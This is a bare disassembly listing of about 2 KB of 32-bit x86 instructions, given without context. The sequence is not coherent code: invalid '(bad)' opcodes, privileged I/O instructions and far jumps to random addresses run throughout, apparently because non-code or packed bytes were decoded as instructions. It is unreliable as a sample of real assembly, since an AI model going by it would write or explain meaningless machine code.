  41566d:	ret    0x2b58
  415670:	icebp  
  415671:	add    BYTE PTR [edx+eax*1+0x62],bh
  415675:	rcr    BYTE PTR [ebp-0x5478d732],1
  41567b:	push   ds
  41567c:	dec    ebx
  41567d:	shl    DWORD PTR fs:[esi],cl
  415680:	pop    ecx
  415681:	and    bl,al
  415683:	inc    ebp
  415684:	cld    
  415685:	fwait
  415686:	push   ss
  415687:	into   
  415688:	push   ebp
  415689:	mov    esp,0xc7881a94
  41568e:	adc    ah,cl
  415690:	jge    0x4156ea
  415692:	jmp    0x80a7:0xf2b171a8
  415699:	mov    esi,0xfad8ec0b
  41569e:	je     0x4156aa
  4156a0:	and    esp,edi
  4156a2:	(bad)  
  4156a3:	push   ecx
  4156a4:	adc    BYTE PTR [ebx-0x2a],dh
  4156a7:	push   ebx
  4156a8:	mov    fs,ebp
  4156aa:	in     al,0xed
  4156ac:	inc    edx
  4156ad:	mov    bh,0x5c
  4156af:	xchg   ebx,ecx
  4156b1:	xor    eax,0xd6f9756b
  4156b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156b7:	inc    ecx
  4156b8:	cmp    DWORD PTR ss:[edi-0x4],ecx
  4156bc:	hlt    
  4156bd:	xchg   ecx,eax
  4156be:	jge    0x41570d
  4156c0:	pop    ds
  4156c1:	inc    ebx
  4156c2:	call   0x6b73:0x39999beb
  4156c9:	or     BYTE PTR [esi+edx*8+0x6a2c7b23],dh
  4156d0:	sahf   
  4156d1:	mov    DWORD PTR ds:0x295b76d1,esp
  4156d7:	retf   0x8480
  4156da:	lea    ebx,ds:0x3bd7d0a1
  4156e0:	cdq    
  4156e1:	push   esi
  4156e2:	push   edx
  4156e3:	xor    edx,DWORD PTR [ebp-0x2b]
  4156e6:	rcr    eax,1
  4156e8:	sahf   
  4156e9:	sub    DWORD PTR [edi+ecx*1-0xe55f794],edx
  4156f0:	xchg   DWORD PTR [esi-0x2ba6ed4a],ebp
  4156f6:	fadd   DWORD PTR [esi+0x17]
  4156f9:	(bad)  
  4156fa:	pop    edx
  4156fb:	mov    ds:0x19ca396,eax
  415700:	mov    edx,0x23f2ce9
  415705:	(bad)  
  415706:	in     eax,dx
  415707:	cld    
  415708:	pop    edi
  415709:	jge    0x415708
  41570b:	retf   0x3268
  41570e:	or     cl,BYTE PTR [ebx-0x7b83f4fb]
  415714:	adc    esp,0xb72b8ae9
  41571a:	lods   eax,DWORD PTR ds:[esi]
  41571b:	xchg   ebp,eax
  41571c:	push   cs
  41571d:	mov    DWORD PTR [ecx+edx*2],esi
  415720:	(bad)  
  415722:	inc    edi
  415723:	ret    
  415724:	jp     0x4156ee
  415726:	jmp    DWORD PTR [ebx+0xe]
  415729:	pop    esi
  41572a:	xor    al,0xb6
  41572c:	jmp    0x4d48:0x48406709
  415733:	mov    edi,0x16617fae
  415738:	adc    al,0xb
  41573a:	mov    ebp,fs
  41573c:	scas   eax,DWORD PTR es:[edi]
  41573d:	sbb    eax,0x76d07d99
  415742:	retf   0x328e
  415745:	push   ebx
  415746:	mov    esp,0x35b1981f
  41574b:	div    DWORD PTR [ecx-0x14]
  41574e:	mov    esp,0x996a455b
  415753:	jae    0x415742
  415755:	int3   
  415756:	mov    esp,0xdb5f9bd8
  41575b:	or     BYTE PTR [ecx-0x1bb4b6e],ah
  415761:	cs je  0x4156ed
  415764:	sub    ch,bl
  415766:	jle    0x4157cf
  415768:	in     al,dx
  415769:	add    edx,DWORD PTR [ebp+0x7f]
  41576c:	test   BYTE PTR [ebp+0xeddf1fa],ah
  415772:	mov    al,ds:0xb2258925
  415777:	into   
  415778:	cmp    ch,BYTE PTR [ecx]
  41577a:	sub    BYTE PTR [edi+0x2b],al
  41577d:	in     eax,0xd6
  41577f:	sbb    eax,0x8149d390
  415784:	out    dx,eax
  415785:	jns    0x4157c8
  415787:	inc    esi
  415788:	inc    esp
  415789:	pusha  
  41578a:	xor    dl,cl
  41578c:	test   eax,0x42fa0d59
  415792:	cmp    al,0xec
  415794:	fcomp  QWORD PTR [edi-0x1a]
  415797:	rcr    BYTE PTR [edi+0x42],1
  41579a:	shl    BYTE PTR fs:[edx+0x43],0x94
  41579f:	pusha  
  4157a0:	adc    eax,0x397ea1b
  4157a5:	dec    edx
  4157a6:	jno    0x415785
  4157a8:	and    DWORD PTR [edx+0x3d9fda4a],eax
  4157ae:	sub    DWORD PTR fs:[edi+ecx*4-0x64],esi
  4157b3:	(bad)  
  4157b4:	in     eax,dx
  4157b5:	jb     0x41579c
  4157b7:	mov    eax,ds:0xae89a32e
  4157bc:	jl     0x41575f
  4157be:	and    al,0xf
  4157c0:	repz or eax,0xe1c76ab4
  4157c6:	test   ch,ah
  4157c8:	(bad)  
  4157c9:	in     eax,0x73
  4157cb:	add    dh,BYTE PTR [ecx-0x7c03449e]
  4157d1:	pop    ecx
  4157d2:	inc    ebp
  4157d3:	jae    0x415823
  4157d5:	sub    edx,DWORD PTR [ebp+0x2b]
  4157d8:	jnp    0x415814
  4157da:	and    BYTE PTR [ebp+0x48],al
  4157dd:	(bad)  
  4157de:	mov    ebp,fs
  4157e0:	jno    0x415846
  4157e2:	pushf  
  4157e3:	pusha  
  4157e4:	xchg   DWORD PTR [ecx+0x35],edi
  4157e7:	push   ebp
  4157e8:	sahf   
  4157e9:	jmp    0x415841
  4157eb:	popa   
  4157ec:	add    BYTE PTR [edi+ebx*8+0x71],al
  4157f0:	mov    esi,0x205c0714
  4157f5:	ror    BYTE PTR [edi-0x7d2288e8],cl
  4157fb:	call   0x5d02f21b
  415800:	sub    dh,BYTE PTR [esi+0x7f785ab9]
  415806:	adc    edi,DWORD PTR [ebp-0x1b]
  415809:	or     al,0xd6
  41580b:	xor    al,0x11
  41580d:	push   esi
  41580e:	daa    
  41580f:	jnp    0x41580c
  415811:	aam    0x8
  415813:	aam    0x63
  415815:	outs   dx,DWORD PTR ds:[esi]
  415816:	mov    al,0x5b
  415818:	cmp    DWORD PTR [ecx+0x4e],eax
  41581b:	and    DWORD PTR [ebx-0x56ff8395],ebx
  415821:	js     0x415870
  415823:	or     bl,BYTE PTR [ebx+0x1b36362f]
  415829:	fs popa 
  41582b:	aad    0xdd
  41582d:	dec    ebp
  41582e:	mov    eax,0x5cc258ac
  415833:	inc    ebp
  415834:	(bad)  
  415835:	dec    ecx
  415836:	fwait
  415837:	or     BYTE PTR [edi+eiz*8-0x27ce51f7],ch
  41583e:	jne    0x4158b5
  415840:	int3   
  415841:	xchg   BYTE PTR [ecx-0xc],bl
  415844:	or     bh,dl
  415846:	std    
  415847:	pushf  
  415848:	jo     0x415866
  41584a:	fnstenv ds:0xbc9c1f
  415850:	lds    ebx,FWORD PTR [edi-0x77]
  415853:	inc    edx
  415854:	mov    ah,0x13
  415856:	jg     0x415808
  415858:	loope  0x4158af
  41585a:	addr16 lahf 
  41585c:	bound  di,DWORD PTR [ecx-0x746e628c]
  415863:	stos   BYTE PTR es:[edi],al
  415864:	cwde   
  415865:	mov    bl,BYTE PTR [esi]
  415867:	jl     0x4158a2
  415869:	xchg   edx,eax
  41586a:	push   0x60
  41586c:	push   0xea1e18b3
  415871:	fistp  DWORD PTR [esi]
  415873:	xchg   esi,eax
  415874:	dec    eax
  415875:	xchg   DWORD PTR ds:0xbcc44419,eax
  41587b:	and    eax,0x52559ade
  415880:	sub    eax,0x8d092ee9
  415885:	pop    ebx
  415886:	mov    ch,0x97
  415888:	mov    bh,0xa2
  41588a:	pop    edi
  41588b:	mov    al,ds:0xb162fae0
  415890:	dec    esi
  415891:	adc    ebx,ecx
  415893:	or     al,0x8f
  415895:	bound  ebp,QWORD PTR [esi+ecx*8-0x12fe96d]
  41589c:	xchg   esi,edi
  41589e:	mov    edx,DWORD PTR [ecx+0x5bada2b8]
  4158a4:	popf   
  4158a5:	stc    
  4158a6:	int    0xe8
  4158a8:	add    esi,DWORD PTR [ecx]
  4158aa:	arpl   WORD PTR [ebp+0xc],sp
  4158ad:	adc    BYTE PTR [edi+ebx*4],bl
  4158b0:	enter  0xc2fd,0x3e
  4158b4:	rol    ecx,0xbf
  4158b7:	cdq    
  4158b8:	adc    al,0x34
  4158ba:	ins    DWORD PTR es:[edi],dx
  4158bb:	mov    esi,0x4aefe4c6
  4158c0:	cdq    
  4158c1:	dec    esi
  4158c2:	dec    eax
  4158c3:	(bad)  
  4158c4:	out    dx,eax
  4158c5:	ins    BYTE PTR es:[edi],dx
  4158c6:	out    0x8f,eax
  4158c8:	aad    0xb9
  4158ca:	jnp    0x41591a
  4158cc:	push   ss
  4158cd:	dec    edi
  4158ce:	xchg   esi,eax
  4158cf:	inc    ecx
  4158d0:	cmp    DWORD PTR [ecx-0x3918c40a],edi
  4158d6:	rcl    cl,cl
  4158d8:	adc    ah,BYTE PTR [ebp+ecx*1+0x64f3a455]
  4158df:	inc    eax
  4158e0:	inc    esp
  4158e1:	inc    ecx
  4158e2:	repnz dec esp
  4158e4:	int    0x45
  4158e6:	fld    QWORD PTR [eax]
  4158e8:	add    BYTE PTR [eax+eax*8+0x52],ah
  4158ec:	repz xchg edx,eax
  4158ee:	clc    
  4158ef:	cli    
  4158f0:	jle    0x415960
  4158f2:	add    bl,BYTE PTR [edi]
  4158f4:	pushf  
  4158f5:	and    BYTE PTR [ecx+0x7],ah
  4158f8:	sbb    eax,0xa7bca4dd
  4158fd:	dec    esp
  4158fe:	mov    ch,0x50
  415900:	mov    ch,0x14
  415902:	sbb    DWORD PTR [eax+0x3fa89edf],ecx
  415908:	in     eax,0xcf
  41590a:	mov    BYTE PTR [eax],cl
  41590c:	sbb    al,0xe6
  41590e:	push   esp
  41590f:	add    al,0x4d
  415911:	dec    esi
  415912:	ja     0x4158d0
  415914:	dec    esi
  415915:	out    dx,eax
  415916:	mov    dl,BYTE PTR [ecx-0x29]
  415919:	inc    esi
  41591a:	fdivr  DWORD PTR [ecx-0x48732ddb]
  415920:	cmp    al,0xfe
  415922:	mov    bl,0x1a
  415924:	inc    ebx
  415925:	(bad)
  415928:	out    dx,eax
  415929:	add    BYTE PTR [ebp-0x5b],cl
  41592c:	imul   eax,ebp,0xffffffea
  41592f:	sbb    eax,esi
  415931:	xor    eax,0x563fed6d
  415936:	lea    edi,[esi]
  415938:	rcl    BYTE PTR ds:[ecx-0x66],1
  41593c:	cmp    al,0x61
  41593e:	cmp    BYTE PTR [edi],0x52
  415941:	retf   
  415942:	ret    0x444d
  415945:	push   esi
  415946:	pop    esp
  415947:	popf   
  415948:	and    eax,edx
  41594a:	daa    
  41594b:	out    0x2e,eax
  41594d:	mov    dh,0xa0
  41594f:	mov    ds:0xf6757a,al
  415954:	xchg   esp,eax
  415955:	and    ecx,edx
  415957:	sbb    bh,al
  415959:	pop    esp
  41595a:	imul   ecx,ebp,0x57
  41595d:	add    cl,BYTE PTR [edi-0x24]
  415960:	out    0x94,eax
  415962:	mov    eax,ds:0x8f4a9d95
  415967:	jae    0x415970
  415969:	mov    esp,0x59fa1a15
  41596e:	shl    DWORD PTR [edx-0x62],1
  415971:	(bad)  
  415972:	cdq    
  415973:	sbb    eax,0x81366128
  415978:	push   edi
  415979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41597a:	add    eax,0x484f584d
  41597f:	mov    bh,0x13
  415981:	js     0x415959
  415983:	adc    bh,BYTE PTR [edi+ebp*2-0x21dd0f6b]
  41598a:	or     eax,0x525c7b78
  41598f:	dec    ecx
  415990:	ins    DWORD PTR es:[edi],dx
  415991:	popa   
  415992:	push   0xffffffa9
  415994:	inc    ebp
  415995:	mov    edi,ecx
  415997:	sub    eax,0x908aa324
  41599c:	and    cl,dh
  41599e:	mov    WORD PTR [ebx-0xb],fs
  4159a1:	repnz cmp al,BYTE PTR [ebx-0x77]
  4159a5:	mov    bh,BYTE PTR [eax+0x69]
  4159a8:	mov    dl,0x35
  4159aa:	fiadd  WORD PTR [ebx]
  4159ac:	fadd   QWORD PTR [ecx]
  4159ae:	imul   esp,DWORD PTR [eax+0x47],0x7ea57645
  4159b5:	data16 (bad) 
  4159b7:	sti    
  4159b8:	cmp    eax,0x20f8e0b6
  4159bd:	loope  0x41599c
  4159bf:	inc    edi
  4159c0:	jb     0x415a2f
  4159c2:	(bad)  
  4159c3:	cld    
  4159c4:	lea    esi,[esi+0x25663f47]
  4159ca:	or     esp,ecx
  4159cc:	cmp    al,0xbe
  4159ce:	sbb    eax,0x16b69867
  4159d3:	add    ebx,DWORD PTR [ecx]
  4159d5:	dec    esp
  4159d6:	pushf  
  4159d7:	add    BYTE PTR [eax],al
  4159d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159da:	lea    ebp,[esi+0x74]
  4159dd:	push   ds
  4159de:	mov    al,0x63
  4159e0:	loopne 0x415989
  4159e2:	xor    al,BYTE PTR [edi+0x1e]
  4159e5:	push   0x4c
  4159e7:	adc    dh,BYTE PTR [edx-0x608ae17a]
  4159ed:	push   ebp
  4159ee:	out    dx,al
  4159ef:	not    bh
  4159f1:	xchg   ecx,eax
  4159f2:	xchg   ebp,eax
  4159f3:	out    dx,al
  4159f4:	jl     0x415977
  4159f6:	adc    eax,0x20b4b8ba
  4159fb:	popf   
  4159fc:	or     esi,DWORD PTR [eax+0x5af543b8]
  415a02:	daa    
  415a03:	das    
  415a04:	adc    eax,0xf487ccdb
  415a09:	inc    ebp
  415a0a:	mov    ebx,DWORD PTR [ecx+0xd]
  415a0d:	inc    edi
  415a0e:	jp     0x415a25
  415a10:	xchg   esi,eax
  415a11:	cmp    ah,BYTE PTR [eax+0x47085fd4]
  415a17:	jp     0x415a41
  415a19:	mov    ch,0x13
  415a1b:	dec    esp
  415a1c:	mov    esp,0x685caff2
  415a21:	loopne 0x4159b6
  415a23:	push   ecx
  415a24:	push   esp
  415a25:	out    dx,al
  415a26:	out    dx,eax
  415a27:	loop   0x4159ab
  415a29:	aad    0x34
  415a2b:	dec    edi
  415a2c:	jnp    0x415a48
  415a2e:	call   0xa921:0xbbd808e4
  415a35:	in     eax,dx
  415a36:	push   ds
  415a37:	ss es push 0xd681570e
  415a3e:	mov    ecx,0xd5d40b00
  415a43:	cmp    esi,eax
  415a45:	pusha  
  415a46:	dec    edi
  415a47:	and    eax,0xea993aaf
  415a4c:	adc    eax,0xe32b64cb
  415a51:	xor    BYTE PTR [esi],al
  415a53:	mov    ds:0xb23216cf,eax
  415a58:	mov    ebx,0xeabb1971
  415a5d:	ins    DWORD PTR es:[edi],dx
  415a5e:	sti    
  415a5f:	add    DWORD PTR [ecx-0x44b9d2cb],edx
  415a65:	mov    bl,0x3c
  415a67:	push   esi
  415a68:	mov    al,0x29
  415a6a:	arpl   bx,sp
  415a6c:	pop    ss
  415a6d:	popf   
  415a6e:	jne    0x4159ff
  415a70:	ffree  st(5)
  415a72:	inc    ebp
  415a73:	or     al,0x1e
  415a75:	cwde   
  415a76:	push   edi
  415a77:	xor    BYTE PTR [eax-0x1c],bl
  415a7a:	cmp    bh,BYTE PTR [ecx]
  415a7c:	cmp    ax,WORD PTR [ecx]
  415a7f:	scas   al,BYTE PTR es:[edi]
  415a80:	call   0x6f80cb2e
  415a85:	sub    ch,bl
  415a87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a88:	cmp    al,0x1b
  415a8a:	mov    edi,0xbd130d0c
  415a8f:	xchg   ebp,eax
  415a90:	lahf   
  415a91:	cmp    al,0xb9
  415a93:	(bad)  
  415a94:	call   0x8f30:0x73b8cab4
  415a9b:	les    eax,FWORD PTR [esi]
  415a9d:	adc    BYTE PTR [ecx-0x23],ch
  415aa0:	inc    ebx
  415aa1:	xchg   ebx,eax
  415aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aa3:	inc    eax
  415aa4:	lods   al,BYTE PTR ds:[esi]
  415aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aa6:	pop    edi
  415aa7:	xor    DWORD PTR [edi],ebp
  415aa9:	sub    dh,0x16
  415aac:	mov    eax,ds:0x6f14a419
  415ab1:	and    bh,BYTE PTR [edi]
  415ab3:	and    BYTE PTR [esp+esi*8-0x65],0x36
  415ab8:	data16 adc BYTE PTR [edi-0x5b358b43],al
  415abf:	imul   esp,DWORD PTR [esi],0xe30afa06
  415ac5:	inc    ecx
  415ac6:	fs cmp al,0xb5
  415ac9:	(bad)  
  415aca:	jae    0x415b2a
  415acc:	and    BYTE PTR [esi],bh
  415ace:	xor    al,0x17
  415ad0:	jae    0x415a90
  415ad2:	mov    ds:0x244c1f6c,al
  415ad7:	test   ch,bh
  415ad9:	lods   al,BYTE PTR ds:[esi]
  415ada:	jecxz  0x415b4d
  415adc:	iret   
  415add:	sti    
  415ade:	leave  
  415adf:	popf   
  415ae0:	retf   
  415ae1:	fsub   DWORD PTR [eax]
  415ae3:	mov    WORD PTR [esi+0x6be3759a],fs
  415ae9:	scas   al,BYTE PTR es:[edi]
  415aea:	cmovne ebp,DWORD PTR [edx]
  415aed:	inc    esi
  415aee:	aaa    
  415aef:	bnd jle 0x415ac0
  415af2:	leave  
  415af3:	(bad)  
  415af4:	add    DWORD PTR [ebp-0x1200d0cd],ebx
  415afa:	mov    ebp,0x93f1a58f
  415aff:	inc    ebx
  415b00:	enter  0x26a0,0x41
  415b04:	cs stc 
  415b06:	mov    al,0xef
  415b08:	stos   BYTE PTR es:[edi],al
  415b09:	aaa    
  415b0a:	sbb    edx,DWORD PTR [edi+0x21]
  415b0d:	mov    eax,0x4bde5f6a
  415b12:	in     al,0x2b
  415b14:	lods   al,BYTE PTR ds:[esi]
  415b15:	repnz or BYTE PTR [edx+ebp*2+0x1f873a66],ah
  415b1d:	xchg   BYTE PTR ds:0x35e9d098,dh
  415b23:	(bad)  
  415b24:	pop    es
  415b25:	jns    0x415b63
  415b27:	mov    bl,BYTE PTR [ebp+0x59]
  415b2a:	out    0xe7,eax
  415b2c:	lds    ebx,FWORD PTR ds:0x29fd577
  415b32:	push   es
  415b33:	pop    edi
  415b34:	shl    DWORD PTR [ebx+0x4cc2e6ec],1
  415b3a:	pop    ebx
  415b3b:	cdq    
  415b3c:	test   BYTE PTR [ebx],dl
  415b3e:	add    BYTE PTR [esi],al
  415b40:	js     0x415ac4
  415b42:	push   eax
  415b43:	and    DWORD PTR [edi+0x4661eca],esi
  415b49:	cmp    eax,0x3bfc96e3
  415b4e:	inc    edi
  415b4f:	daa    
  415b50:	cmp    ecx,DWORD PTR [edx+0x425f6e4c]
  415b56:	gs mov dl,0x54
  415b59:	(bad)  
  415b5a:	ins    BYTE PTR es:[edi],dx
  415b5b:	mov    cl,0xe9
  415b5d:	int    0x3e
  415b5f:	mov    eax,ds:0xab0b03d7
  415b64:	sub    bl,BYTE PTR [ebp-0x61]
  415b67:	jp     0x415b44
  415b69:	mov    WORD PTR [ecx-0x54fae20f],ss
  415b6f:	inc    ebx
  415b70:	mov    esi,0x76da8d43
  415b75:	push   ecx
  415b76:	ss clc 
  415b78:	cmp    BYTE PTR [esi],0xc0
  415b7b:	mov    BYTE PTR [esi+0x4f],ah
  415b7e:	mov    WORD PTR [esi],?
  415b80:	jne    0x415b67
  415b82:	sbb    eax,0xcfcf495f
  415b87:	inc    al
  415b89:	cmp    ah,bl
  415b8b:	sub    cl,dh
  415b8d:	sbb    al,0xda
  415b8f:	into   
  415b90:	sti    
  415b91:	sbb    dl,BYTE PTR [ebx-0x1faee66e]
  415b97:	fld    DWORD PTR [edx]
  415b99:	adc    DWORD PTR [esi+0xa],edi
  415b9c:	jb     0x415b3a
  415b9e:	cmp    ch,BYTE PTR [edi+0x362c0204]
  415ba4:	mov    cl,0x34
  415ba6:	adc    al,BYTE PTR [ecx+0x2d]
  415ba9:	adc    esp,ecx
  415bab:	adc    esi,eax
  415bad:	cmp    esi,0xffffffbd
  415bb0:	call   0xc46c:0xefb0bd32
  415bb7:	xchg   edi,eax
  415bb8:	inc    ecx
  415bb9:	adc    al,0x6a
  415bbb:	jbe    0x415b3d
  415bbd:	out    dx,al
  415bbe:	adc    DWORD PTR [edx+0x6bb43dd0],0xffffffd5
  415bc5:	ja     0x415b8f
  415bc7:	stos   DWORD PTR es:[edi],eax
  415bc8:	pop    edi
  415bc9:	cli    
  415bca:	cmp    BYTE PTR [esi],ch
  415bcc:	sub    al,0x61
  415bce:	pop    ecx
  415bcf:	cs test al,0xf
  415bd2:	test   BYTE PTR [edi+0x47c31855],dl
  415bd8:	ins    DWORD PTR es:[edi],dx
  415bd9:	xor    ch,BYTE PTR [edi*1+0x6ed04347]
  415be0:	dec    ebx
  415be1:	arpl   WORD PTR [ecx-0x7b],bp
  415be4:	xchg   ecx,eax
  415be5:	je     0x415b7b
  415be7:	fmul   DWORD PTR [edi+0x1]
  415bea:	xchg   edi,eax
  415beb:	mov    eax,ds:0xc0b4ecf0
  415bf0:	(bad)  
  415bf1:	or     BYTE PTR [ebx+0x57],cl
  415bf4:	xlat   BYTE PTR ds:[ebx]
  415bf5:	sbb    BYTE PTR [ebx+ebp*8+0x67],cl
  415bf9:	mov    ebp,0x3f70aad7
  415bfe:	lods   al,BYTE PTR es:[esi]
  415c00:	or     DWORD PTR [esp+eiz*2+0x7d],edi
  415c04:	cli    
  415c05:	arpl   sp,dx
  415c07:	mov    esp,DWORD PTR [edi+0x77db83ee]
  415c0d:	dec    eax
  415c0e:	call   0xb77b133c
  415c13:	int3   
  415c14:	inc    edx
  415c15:	call   0xc785:0x450d466
  415c1c:	sub    al,0x35
  415c1e:	cwde   
  415c1f:	mov    bl,0x71
  415c21:	add    esp,DWORD PTR [ebp+0x7bead736]
  415c27:	push   0xe4568943
  415c2c:	imul   edi,DWORD PTR [ecx],0xffffffb3
  415c2f:	retf   0x1a33
  415c32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c33:	adc    esp,DWORD PTR [ecx+0x32]
  415c36:	arpl   dx,ax
  415c38:	jne    0x415c86
  415c3a:	mul    DWORD PTR [esi]
  415c3c:	sub    edx,ebp
  415c3e:	jne    0x415be9
  415c40:	dec    ebx
  415c41:	xchg   esi,eax
  415c42:	addr16 mov esp,0x55f4ed41
  415c48:	ins    DWORD PTR es:[edi],dx
  415c49:	jb     0x415c5d
  415c4b:	add    dl,BYTE PTR [esi-0x568c1e98]
  415c51:	fsubr  DWORD PTR [ebp-0x6c]
  415c54:	sub    al,0x8d
  415c56:	and    BYTE PTR [ebx-0x47d346d4],bh
  415c5c:	jns    0x415c18
  415c5e:	xchg   edi,eax
  415c5f:	rcl    DWORD PTR [edi+0x12],0x32
  415c63:	es pop ebx
  415c65:	cwde   
  415c66:	rol    dh,cl
  415c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c69:	mov    bh,0x80
  415c6b:	sub    DWORD PTR [esi+0x6e],esp
  415c6e:	dec    esp
  415c6f:	mov    WORD PTR [esi+0x53787152],ss
  415c75:	fistp  WORD PTR [ecx+0x79]
  415c78:	mov    BYTE PTR [esi+0x1500dab2],dl
  415c7e:	sbb    ecx,DWORD PTR ds:[ecx-0x77]
  415c82:	pop    eax
  415c83:	lods   eax,DWORD PTR ds:[esi]
  415c84:	fistp  WORD PTR ds:0xa9856ef1
  415c8b:	jb     0x415c8d
  415c8d:	popf   
  415c8e:	fnstcw WORD PTR [eax-0x15]
  415c91:	ja     0x415cd5
  415c93:	lods   al,BYTE PTR ds:[esi]
  415c94:	pusha  
  415c95:	iret   
  415c96:	shl    DWORD PTR ss:[ecx+0x19],1
  415c9a:	mov    ah,0xd2
  415c9c:	(bad)  
  415c9d:	fwait
  415c9e:	jns    0x415c8c
  415ca0:	popa   
  415ca1:	xchg   ebx,eax
  415ca2:	outs   dx,DWORD PTR ds:[esi]
  415ca3:	mov    ds:0x265661f7,al
  415ca8:	loop   0x415cdd
  415caa:	sub    DWORD PTR [eax-0x3d5cce82],edi
  415cb0:	stos   BYTE PTR es:[edi],al
  415cb1:	pop    esp
  415cb2:	cmp    eax,0x5d1d0087
  415cb7:	ret    
  415cb8:	stos   DWORD PTR es:[edi],eax
  415cb9:	and    eax,0x489e02d4
  415cbe:	(bad)  
  415cbf:	lds    ebp,FWORD PTR [edi]
  415cc1:	add    eax,0xa7763d03
  415cc6:	push   eax
  415cc7:	cmp    DWORD PTR ds:0xebb2dc0c,ebp
  415ccd:	aas    
  415cce:	imul   ebp,DWORD PTR [ebx+0x51a2d0ed],0x8522f655
  415cd8:	and    BYTE PTR [ebp+0x47],dh
  415cdb:	ins    BYTE PTR es:[edi],dx
  415cdc:	or     al,0xd0
  415cde:	jle    0x415c96
  415ce0:	add    DWORD PTR [ebp+0x4e],esp
  415ce3:	xor    BYTE PTR [ecx-0x44327a53],0xa1
  415cea:	pop    ss
  415ceb:	or     edx,esp
  415ced:	push   ebx
  415cee:	je     0x415cdc
  415cf0:	xchg   ebp,eax
  415cf1:	xor    bl,BYTE PTR [ecx]
  415cf3:	pusha  
  415cf4:	pop    edi
  415cf5:	test   BYTE PTR [eax],bl
  415cf7:	cs jns 0x415d53
  415cfa:	jno    0x415cdd
  415cfc:	sub    al,0xa6
  415cfe:	mov    bl,0x2c
  415d00:	and    ebp,DWORD PTR [eax]
  415d02:	xchg   ebx,eax
  415d03:	add    eax,0xb6b14174
  415d08:	mov    bl,0xd8
  415d0a:	iret   
  415d0b:	imul   BYTE PTR [eax]
  415d0d:	in     al,dx
  415d0e:	nop
  415d0f:	push   ecx
  415d10:	sub    BYTE PTR [esi+eiz*2-0x14],bh
  415d14:	leave  
  415d15:	mov    al,0x46
  415d17:	fidiv  WORD PTR [edx]
  415d19:	xchg   DWORD PTR ds:0x8fe815d5,esp
  415d1f:	lahf   
  415d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d21:	aad    0x57
  415d23:	imul   ebp,DWORD PTR [eax+0x21],0xffffffcc
  415d27:	and    BYTE PTR [eax+eiz*1-0x25940abe],al
  415d2e:	pop    edx
  415d2f:	push   0xa07334dc
  415d34:	mov    esi,0x5430375e
  415d39:	fcomp  DWORD PTR [eax+0x31]
  415d3c:	je     0x415d8e
  415d3e:	pushf  
  415d3f:	sbb    dh,BYTE PTR [ebx]
  415d41:	sbb    BYTE PTR [edx],bl
  415d43:	dec    edi
  415d44:	push   edx
  415d45:	mov    edx,0x55bd862b
  415d4a:	dec    ecx
  415d4b:	push   es
  415d4c:	dec    eax
  415d4d:	push   0xfe7c4ceb
  415d52:	cdq    
  415d53:	mov    si,0x6b89
  415d57:	out    dx,eax
  415d58:	cmp    ebx,DWORD PTR [ebp-0x7cf70a6f]
  415d5e:	xor    al,0x38
  415d60:	lods   eax,DWORD PTR ds:[esi]
  415d61:	mov    bl,0x85
  415d63:	add    DWORD PTR [edi],ecx
  415d65:	adc    edi,ebx
  415d67:	fstp   TBYTE PTR [edx+eax*8]
  415d6a:	retf   
  415d6b:	lock mov bl,0xef
  415d6e:	and    eax,0xabfb9e4d
  415d73:	pop    es
  415d74:	(bad)  [ecx+0x582bcc81]
  415d7a:	in     eax,dx
  415d7b:	cli    
  415d7c:	dec    dx
  415d7e:	je     0x415d91
  415d80:	xchg   edx,eax
  415d81:	daa    
  415d82:	in     al,dx
  415d83:	out    dx,eax
  415d84:	dec    edi
  415d85:	stc    
  415d86:	(bad)  
  415d88:	in     eax,0x41
  415d8a:	out    0xe3,al
  415d8c:	mov    BYTE PTR [ebp-0x339cf18],cl
  415d92:	dec    ecx
  415d93:	hlt    
  415d94:	push   ecx
  415d95:	mov    ah,0x93
  415d97:	inc    ebp
  415d98:	imul   dh
  415d9a:	cdq    
  415d9b:	int    0xa9
  415d9d:	jbe    0x415de4
  415d9f:	dec    edx
  415da0:	loop   0x415d60
  415da2:	or     DWORD PTR [ebp+0x1e4ead86],esp
  415da8:	pusha  
  415da9:	test   eax,0x990b73b7
  415dae:	inc    esi
  415daf:	and    DWORD PTR [edx+edx*1],0xdbb21d9d
  415db6:	scas   al,BYTE PTR es:[edi]
  415db7:	fild   WORD PTR [ebp-0x2d558f98]
  415dbd:	pop    esp
  415dbe:	stos   BYTE PTR es:[edi],al
  415dbf:	jmp    0xe4a5:0x1bffa816
  415dc6:	fistp  WORD PTR [edi+0x5b]
  415dc9:	jp     0x415d83
  415dcb:	pushf  
  415dcc:	jge    0x415d5a
  415dce:	fistp  QWORD PTR [edx]
  415dd0:	xchg   esp,eax
  415dd1:	fidivr WORD PTR [esi+0x7a]
  415dd4:	gs pusha 
  415dd6:	(bad)  
  415dd7:	repz xor DWORD PTR [eax+0x6b],ebx
  415ddb:	out    dx,al
  415ddc:	in     eax,0xcd
  415dde:	or     ebx,eax
  415de0:	scas   eax,DWORD PTR es:[edi]
  415de1:	lock icebp 
  415de3:	das    
  415de4:	sbb    edi,ebx
  415de6:	and    eax,0x4d825087
  415deb:	sbb    DWORD PTR [esp+esi*1-0x5fbc4300],eax
  415df2:	aaa    
  415df3:	adc    BYTE PTR [eax+ebx*8+0x7f],bh
  415df7:	xor    bh,BYTE PTR ds:0x43ec4502
  415dfd:	fld    QWORD PTR [esi]
  415dff:	mov    al,0xcb
  415e01:	enter  0x65fd,0xd9
  415e05:	fidivr WORD PTR [edx-0xed4417c]
  415e0b:	rcl    edi,1
  415e0d:	(bad)  
  415e0f:	add    bl,BYTE PTR ds:0x79649036
  415e15:	dec    eax
  415e16:	jo     0x415dfe
  415e18:	push   es
  415e19:	aaa    
  415e1a:	nop
  415e1b:	test   eax,0xb72cd277
  415e20:	sbb    ah,0xdd
  415e23:	inc    eax
  415e24:	or     DWORD PTR ds:0x99fcf5e1,eax
  415e2a:	pop    edx
  415e2b:	nop
  415e2c:	mov    ds:0x1f2e4daf,al
  415e31:	and    ch,ch
  415e33:	pop    ebx
  415e34:	popf   
